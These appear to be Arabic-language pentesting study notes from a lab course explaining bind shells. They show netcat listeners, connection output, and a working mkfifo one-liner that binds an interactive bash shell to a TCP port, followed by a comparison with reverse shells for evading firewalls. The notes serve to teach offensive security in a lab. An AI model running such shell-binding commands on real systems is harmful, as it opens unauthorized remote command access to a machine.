- احنا كا pentesters عشان نعرف ناخد shell علي Local or remote network
- ده معناه اننا لازم نستخدم teminal emulator علي الmachine بتاعتك كا attacker عشان نتحكم بالremote system بتاع الضحيه وده بيتم عن طريق ال`Bind Shell` او ال `Reverse Shell`
----
## What Is It?
- الBind Shell دي طريقة من طرق الحصول علي shell علي جهاز الضحيه
- فكرتها ان احنا بنفتح بورت او listener يعني علي الtarget system والجهاز ده بيستني الاتصال من الpentester's system
- يعني مثلا جهاز الضحية يفتح اي بورت عنده زي مثلا 
```
nc -nlvp 1337
Listening on 0.0.0.0 1337
```
دلوقتي الضحيه فاتحه بورت ومستنيه اي اتصال يجلها من خلال البورت ده
**ليه الBind Shell صعب شوية؟**
1. لازم يكون في Listener شغال علي جهاز الضحيه
2. لو مفيش Listener لازم تلاقي طريق تشغله
3. الFirewall بتاع الشبكه غالبا قافل البورتات دي
4. الFirewall بتاع النظام نفسه بيمنع الاتصال
- هنستخدم اداة `nc` عشان نفتح port او عشان تتصل ببورت 
---
## Practicing with GNU Netcat
- اول حاجه عشان ننفذ attack بال bind shell لازم نفتح بورت علي جهاز الضحيه فا هنكتب
#### No. 1: Server - Target starting Netcat listener

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```
دلوقتي السيرفر اللي هو جهاز الضحيه مثلا مستني اتصال يجيلو علي البورت ده
- نيجي بقي علي الجهاز بتاعنا ونتصل بالبورت ده
#### No. 2: Client - Attack box connecting to target

```shell-session
0xTroj6n@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```
- خلي بالك احنا هنا كتبنا الip بتاع التارجت والبورت اللي احنا فتحناه علي جهاز الضحيه فوق اللي هو `7777` اول ما دوسنا انتر الاتصال نجح
#### No. 3: Server - Target receiving connection from client

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```
- خلي بالك ده مش shell كامل ده عباره عن netcat TCP session بس يعني مش تنفيذ اوامر بشكل فعلي ده الfunctionality بتاعته ان لو كتبت simple message من عندك هتظهر عن الضحيه
#### No. 4: Client - Attack box sending message Hello Academy

```shell-session
0xTroj6n@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Once we type the message and hit enter, we will notice the message is received on the server-side.

#### No. 5: Server - Target receiving Hello Academy message

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```
---
## Establishing a Basic Bind Shell with Netcat
- زي ماقولتلك فوق ان ده مش shell فعليا ده مجرد رساله بكتبها بتظهر هناك طب ازاي نشغل الshell بقي ونتعامل مع اوامر النظام والكلام الجميل ده كله؟
- علي جهاز الضحيه احنا فتحنا بورت وخلاص مقولناش ليه افتح شل علي البورت ده فا هنقولو الأمر ده
#### No. 1: Server - Binding a Bash shell to the TCP session

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### No. 2: Client - Connecting to bind shell on target

```shell-session
0xTroj6n@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```
- في **bind shell**: الـ target (الضحية) بيفتح بورت وبيستنى حد يتصل بيه، يعني هو اللي بيعمل listen
    
- عشان كده لو فيه فايروول أو أي دفاع ضد “incoming connections” (وصلات داخلة)، الموضوع سهل يتكشف أو يتمنع.
    
- ال“bind shell” ده بسيط جدًا (لأنه مفيش دفاعات ولا فوايروول قوي)، لكن في حالات حقيقية غالبًا ما تستخدم **reverse shell** لأنه أكثر صعوبة في الكشف من الدفاعات
---
